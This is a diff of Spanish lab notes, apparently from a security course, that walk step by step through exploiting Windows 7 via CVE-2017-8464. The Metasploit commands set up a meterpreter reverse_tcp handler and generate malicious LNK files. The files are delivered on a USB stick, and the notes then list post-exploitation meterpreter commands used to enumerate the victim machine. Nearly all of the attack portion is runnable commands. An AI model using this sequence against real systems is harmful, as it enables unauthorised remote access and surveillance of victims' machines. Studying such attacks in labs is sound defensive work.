@@ -153,19 +153,22 @@ Explicación Práctica
 4- Abrir la consola en kali
 msfconsole
 5- hacer exploit
-use exploit/multi/handler (crear handler para la conexión)
-6- set payload windows/x64/meterpreter/reverse_tcp
-7- set LHOST 10.191.4.4(mi ip)
-8- show options (para verificar puerto)
-9- exploit -j
-10- back
-11- use exploit/windows/fileformat/cve_2017_8464_lnk_rce (creo los archivos)
-12- set payload windows/x64/meterpreter/reverse_tcp
-13- set LHOST 10.191.4.4(mi ip)
-14- show options
-15- exploit (hago exploit y aparecen los archivos)
-16- abro otro cmd para verificar la dirección de los archivos
-17- xdg-open /roor/.msf4/local/
+msf5>use exploit/multi/handler (crear handler para la conexión)
+6- msf5 exploit(multi/handler)>set payload windows/x64/meterpreter/reverse_tcp
+7-  msf5 exploit(multi/handler)>set LHOST 10.191.4.4(mi ip kali)
+8-  msf5 exploit(multi/handler)>show options (para verificar puerto)
+9-  msf5 exploit(multi/handler)>exploit -j
+10- msf5 exploit(multi/handler)>back
+11- msf5>use exploit/windows/fileformat/cve_2017_8464_lnk_rce (creo los archivos)
+12- msf5 exploit(windows/fileformat/cve_2017_8464_lnk_rce)>info
+13-msf5 exploit(windows/fileformat/cve_2017_8464_lnk_rce)>set payload windows/x64/meterpreter/reverse_tcp
+14- msf5 exploit(windows/fileformat/cve_2017_8464_lnk_rce)>set LHOST 10.191.4.4
+15-msf5 exploit(windows/fileformat/cve_2017_8464_lnk_rce)>show options
+16- msf5 exploit(windows/fileformat/cve_2017_8464_lnk_rce)>exploit
+(visualizo los archivos creados)
+17- abro otra consola 
+xdg-opne /root/.msf4/local/
+(abro la capreta donde se crean los archivos)
 18- copio los archivos creados en la memoria usb y expulso la memoria de kali
 19- abro la memoria en windows 7
 20- se inicia la sesión
@@ -177,9 +180,11 @@ podemos visualizar los archivos en el directorio remoto actual
 podemos visualizar toda la información de todas las tarjetas de red existente en la maquina
 25- meterpreter>getprivs
 con getuid podemos consultar el tipo de usuario que la maquina victima está ejecutabdo
-26-meterpreter>ps
-podemos ver los procesos que están en ejecución 
-27- sysinfo
+26-meterpreter>getuid
+podemos consultar el usuario que la victima está ejecutando
+27-meterpreter>ps 
+podemos ver los procesos que se están ejecutando
+27-meterpreter>sysinfo
 obtenemos información del sistema:
 nombre maquina, sistema operativo, tipo de arquitectura
 28- meterpreter>idletime
